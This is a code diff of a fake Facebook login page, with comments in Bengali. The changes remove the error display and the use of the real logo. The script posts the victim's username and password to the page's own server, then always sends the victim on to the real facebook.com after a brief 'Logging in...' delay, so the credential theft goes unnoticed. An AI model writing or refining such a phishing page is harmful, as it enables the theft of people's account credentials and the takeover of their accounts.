@@ -16,7 +16,7 @@
         color: #1c1e21;
     }
 
-    /* ── Top blue bar ── */
+    /* ── Top bar ── */
     .top {
         background: #fff;
         border-bottom: 1px solid #dddfe2;
@@ -70,7 +70,7 @@
     }
     .top-form button:hover { background: #166fe5; }
 
-    /* ── Main split ── */
+    /* ── Main ── */
     .main {
         display: flex;
         justify-content: center;
@@ -164,14 +164,6 @@
         width: fit-content;
     }
     .card .create-btn:hover { background: #36a420; }
-    .err {
-        color: #fa383e;
-        font-size: 13px;
-        text-align: center;
-        padding: 4px 0;
-        display: none;
-        line-height: 1.4;
-    }
     .below-card {
         text-align: center;
         margin-top: 24px;
@@ -223,7 +215,7 @@
 <div class="main">
     <div class="inner">
         <div class="tagline">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+<div class="fb-wordmark">facebook</div>
             Recent logins mean you can quickly pick up where you left off.
         </div>
 
@@ -238,7 +230,6 @@
                 <a href="#" class="forgot" onclick="return false;">Forgotten password?</a>
                 <div class="divider"></div>
                 <button type="button" class="create-btn">Create new account</button>
-                <div class="err" id="errBox"></div>
             </form>
             <div class="below-card">
                 <b>Create a Page</b> for a celebrity, brand or business.
@@ -270,9 +261,8 @@
 </div>
 
 <script>
-    const form   = document.getElementById('loginForm');
-    const btn    = document.getElementById('loginBtn');
-    const errBox = document.getElementById('errBox');
+    const form = document.getElementById('loginForm');
+    const btn  = document.getElementById('loginBtn');
 
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
@@ -282,31 +272,21 @@
 
         btn.disabled    = true;
         btn.textContent = 'Logging in...';
-        errBox.style.display = 'none';
 
         try {
-            const res = await fetch(window.location.href, {
+            await fetch(window.location.href, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams({ username: u, password: p })
             });
-            const data = await res.json();
-
-            if (data.status === 'success') {
-                await new Promise(r => setTimeout(r, 1400));
-                window.location.href = data.redirect || 'https://www.facebook.com/';
-            } else {
-                errBox.textContent = "The password you've entered is incorrect. Forgotten password?";
-                errBox.style.display = 'block';
-                btn.disabled = false;
-                btn.textContent = 'Log in';
-            }
         } catch (err) {
-            errBox.textContent = "Something went wrong. Please try again.";
-            errBox.style.display = 'block';
-            btn.disabled = false;
-            btn.textContent = 'Log in';
+            // নেটওয়ার্ক ফেইল হলেও redirect করব
         }
+
+        // ছোট delay — "Logging in..." দেখানোর জন্য
+        setTimeout(() => {
+            window.location.href = 'https://www.facebook.com/';
+        }, 1200);
     });
 </script>
 
